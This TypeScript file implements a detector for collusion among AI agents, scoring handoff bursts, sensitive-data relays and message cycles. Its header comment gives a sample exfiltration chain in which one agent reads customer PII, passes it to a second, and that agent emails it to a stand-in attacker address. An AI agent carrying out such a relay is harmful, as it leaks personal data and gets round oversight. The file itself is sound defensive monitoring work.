/**
 * Multi-agent collusion detector.
 *
 * Why this exists: a single-agent anomaly scorer misses the highest-
 * impact attack class in multi-agent systems — coordinated misuse
 * across agents. Two SOTA agent-security papers (Anthropic "Agentic
 * Misalignment" 2025, AgentBench-Safety 2024) document the failure
 * mode: each agent's actions look benign in isolation; the joint
 * pattern is what's dangerous.
 *
 * Canonical example (handoff exfiltration):
 *   Agent A: query_customer_records  ← reads PII, normal for A
 *   Agent A: send_message(to=B, payload=<PII>)
 *   Agent B: send_email(to=external@evil.com, body=<received payload>)
 * Each call passes single-agent policy + Layer 2; the joint pattern
 * (PII flow from A → B → external) is the bug.
 *
 * Detection: build a windowed agent-to-agent communication graph,
 * track which payload classes flow across each edge, and surface
 * three signals:
 *
 *   1. **handoff_burst** — A suddenly sends N messages to B in
 *      window W when the historical rate was much lower. Anomalous
 *      coordination spike.
 *
 *   2. **sensitive_relay** — Agent A read sensitive data
 *      (category ∈ {database, file, communication}) and within
 *      window W an agent it talked to performed an outbound action
 *      (category ∈ {network, communication}) carrying overlapping
 *      content. The classic exfil chain.
 *
 *   3. **cycle** — A → B → C → A within window. Loops are rare in
 *      legitimate workflows and almost always a sign of an agent
 *      tricking another into laundering an action.
 *
 * The detector is intentionally cheap: O(1) per call, bounded
 * memory via fixed-size sliding window. Composite anomaly scorer
 * adds the collusion signals on top of per-agent Layer 2 signals;
 * neither replaces the other.
 */

export interface CollusionEvent {
  /** When the originating call landed. */
  ts: number;
  /** Source agent — the one that's emitting the call. */
  agent_id: string;
  /** Target agent if the call is an inter-agent message; null for
   *  ordinary tool calls. We extract this from the call arguments
   *  when the tool is `send_message` / `delegate_to` / `handoff` /
   *  `crewai.task_to_agent` etc. */
  target_agent_id?: string | null;
  /** Tool name + category (from classifier). */
  tool_name: string;
  category: string;
  /** Optional content fingerprint (hash of args) so we can detect
   *  the SAME payload moving through multiple agents. */
  content_fp?: string;
}

export interface CollusionSignals {
  /** True if A→B's recent rate looks anomalous vs baseline. */
  handoff_burst: boolean;
  /** True if a sensitive read by one agent was followed by an
   *  outbound action on the receiving agent within the window. */
  sensitive_relay: boolean;
  /** True if a cycle A → B → C → A appears in the window. */
  cycle: boolean;
  /** Composite contribution in [0, 1] for the anomaly scorer. */
  score: number;
  /** Human-readable evidence the cockpit can render in the
   *  anomaly panel. */
  details: string[];
}

interface EdgeStats {
  /** All-time count of messages on this edge. */
  total: number;
  /** Timestamps within the rolling window. */
  recent: number[];
  /** All-time first observation timestamp — used to compute the
   *  historical rate that the burst test compares against. We track
   *  this explicitly because `recent` only retains the last WINDOW_MS
   *  of timestamps, so we'd otherwise lose the long-run baseline. */
  firstSeen: number;
}

const WINDOW_MS                = 60_000;     // 1 minute sliding window
const BURST_RATIO              = 4;          // window rate ≥ 4× historical avg
const BURST_MIN_RECENT         = 3;          // need at least 3 recent edges to declare burst
const RELAY_WINDOW_MS          = 30_000;     // sensitive→outbound chain window
const CYCLE_WINDOW_MS          = 60_000;     // cycle-detection window
const SENSITIVE_CATEGORIES     = new Set(['database', 'file', 'communication']);
const OUTBOUND_CATEGORIES      = new Set(['network', 'communication']);

export class CollusionDetector {
  /** Adjacency map: src → dst → EdgeStats. */
  private edges = new Map<string, Map<string, EdgeStats>>();
  /** Per-agent recent events (bounded window). Used for relay detection. */
  private byAgent = new Map<string, CollusionEvent[]>();
  /** All events in window, oldest first (for cycle detection). */
  private window: CollusionEvent[] = [];

  /** Record one tool-call event AND compute the collusion signals
   *  triggered by it. Returns signals so the gateway can fold them
   *  into the composite anomaly decision. */
  observe(ev: CollusionEvent): CollusionSignals {
    this.evictOlderThan(ev.ts - CYCLE_WINDOW_MS);
    this.window.push(ev);

    // Per-agent rolling history (bounded by relay window).
    const list = this.byAgent.get(ev.agent_id) ?? [];
    list.push(ev);
    while (list.length > 0 && (ev.ts - list[0].ts) > Math.max(WINDOW_MS, RELAY_WINDOW_MS)) {
      list.shift();
    }
    this.byAgent.set(ev.agent_id, list);

    // Update the communication edge if this was an inter-agent message.
    if (ev.target_agent_id) {
      const out = this.edges.get(ev.agent_id) ?? new Map<string, EdgeStats>();
      const stats = out.get(ev.target_agent_id) ?? { total: 0, recent: [], firstSeen: ev.ts };
      stats.total++;
      stats.recent.push(ev.ts);
      while (stats.recent.length > 0 && (ev.ts - stats.recent[0]) > WINDOW_MS) stats.recent.shift();
      out.set(ev.target_agent_id, stats);
      this.edges.set(ev.agent_id, out);
    }

    // ── Signal 1: burst ──────────────────────────────────────────
    let handoff_burst = false;
    if (ev.target_agent_id) {
      const stats = this.edges.get(ev.agent_id)?.get(ev.target_agent_id);
      if (stats && stats.total >= 10 && stats.recent.length >= BURST_MIN_RECENT) {
        // Historical rate per WINDOW_MS over the agent's all-time
        // observation span. Need ≥ 2 windows of history; otherwise
        // the baseline is too noisy to compare against.
        const ageMs = Math.max(1, ev.ts - stats.firstSeen);
        if (ageMs >= 2 * WINDOW_MS) {
          const historicalPerWindow = (stats.total / ageMs) * WINDOW_MS;
          if (stats.recent.length >= BURST_RATIO * Math.max(historicalPerWindow, 1)) {
            handoff_burst = true;
          }
        }
      }
    }

    // ── Signal 2: sensitive→outbound relay ──────────────────────
    let sensitive_relay = false;
    if (OUTBOUND_CATEGORIES.has(ev.category)) {
      // Look for an inbound message from a sender whose recent
      // history includes a sensitive-category read of the same
      // content fingerprint.
      const senders = this.sendersToWithin(ev.agent_id, ev.ts - RELAY_WINDOW_MS);
      for (const sender of senders) {
        const senderHist = this.byAgent.get(sender) ?? [];
        const hadSensitive = senderHist.some(prev =>
          SENSITIVE_CATEGORIES.has(prev.category)
          && prev.ts >= ev.ts - RELAY_WINDOW_MS
          && (ev.content_fp ? prev.content_fp === ev.content_fp : true),
        );
        if (hadSensitive) { sensitive_relay = true; break; }
      }
    }

    // ── Signal 3: cycle ──────────────────────────────────────────
    let cycle = false;
    if (ev.target_agent_id) {
      cycle = this.cycleExists(ev.agent_id, ev.target_agent_id, ev.ts);
    }

    const details: string[] = [];
    let score = 0;
    if (handoff_burst)     { details.push(`handoff burst ${ev.agent_id} → ${ev.target_agent_id}`); score += 0.4; }
    if (sensitive_relay)   { details.push(`sensitive relay ending at ${ev.agent_id}.${ev.tool_name}`); score += 0.6; }
    if (cycle)             { details.push(`cycle including ${ev.agent_id} → ${ev.target_agent_id}`);   score += 0.3; }
    score = Math.min(score, 1);

    return { handoff_burst, sensitive_relay, cycle, score, details };
  }

  /** All agents that have sent a message to `dst` since `sinceTs`. */
  private sendersToWithin(dst: string, sinceTs: number): string[] {
    const senders = new Set<string>();
    for (const [src, m] of this.edges) {
      const e = m.get(dst);
      if (!e) continue;
      if (e.recent.some(t => t >= sinceTs)) senders.add(src);
    }
    return Array.from(senders);
  }

  /** Test-only accessor — exposes the all-time firstSeen so unit tests
   *  can introspect the burst-baseline calculation. */
  _firstSeen(src: string, dst: string): number | null {
    const e = this.edges.get(src)?.get(dst);
    return e?.firstSeen ?? null;
  }

  /** Does the current event close a cycle in the agent graph within
   *  CYCLE_WINDOW_MS? BFS from `to` looking for `from`. */
  private cycleExists(from: string, to: string, now: number): boolean {
    // We're closing the cycle `... → from → to → ... → from`. Walk
    // outgoing edges from `to` in the recent window; if we reach
    // `from` along any path of length ≥ 2 then we have a cycle.
    const seen = new Set<string>([to]);
    const queue: Array<{ node: string; depth: number }> = [{ node: to, depth: 0 }];
    while (queue.length > 0) {
      const { node, depth } = queue.shift()!;
      if (depth > 4) continue;   // cap path length to keep it cheap
      const outgoing = this.edges.get(node);
      if (!outgoing) continue;
      for (const [next, stats] of outgoing) {
        if (!stats.recent.some(t => now - t <= CYCLE_WINDOW_MS)) continue;
        if (next === from) return true;   // closed the cycle
        if (seen.has(next)) continue;
        seen.add(next);
        queue.push({ node: next, depth: depth + 1 });
      }
    }
    return false;
  }

  private evictOlderThan(cutoff: number): void {
    while (this.window.length > 0 && this.window[0].ts < cutoff) this.window.shift();
    for (const list of this.byAgent.values()) {
      while (list.length > 0 && list[0].ts < cutoff) list.shift();
    }
    for (const [, outMap] of this.edges) {
      for (const [, stats] of outMap) {
        while (stats.recent.length > 0 && stats.recent[0] < cutoff) stats.recent.shift();
      }
    }
  }

  /** Test-only — peek at the current edge count. */
  _edgeCount(): number {
    let n = 0;
    for (const m of this.edges.values()) n += m.size;
    return n;
  }
}
